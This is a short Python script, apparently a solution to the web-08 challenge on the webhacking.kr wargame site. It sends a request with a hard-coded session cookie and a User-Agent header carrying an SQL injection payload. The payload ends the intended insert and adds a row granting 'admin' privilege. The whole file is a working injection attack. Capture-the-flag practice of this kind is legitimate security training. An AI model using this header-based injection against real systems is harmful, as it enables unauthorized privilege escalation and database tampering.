import requests
url = "http://webhacking.kr/challenge/web/web-08/"

headers = {
	"Cookie":"PHPSESSID=c603acca73669c676d425537a0ae53d9",
	"Host":"webhacking.kr",
	"User-Agent":"hackyu','1','admin'),('2"
}


res = requests.get(url,headers=headers)
print res.content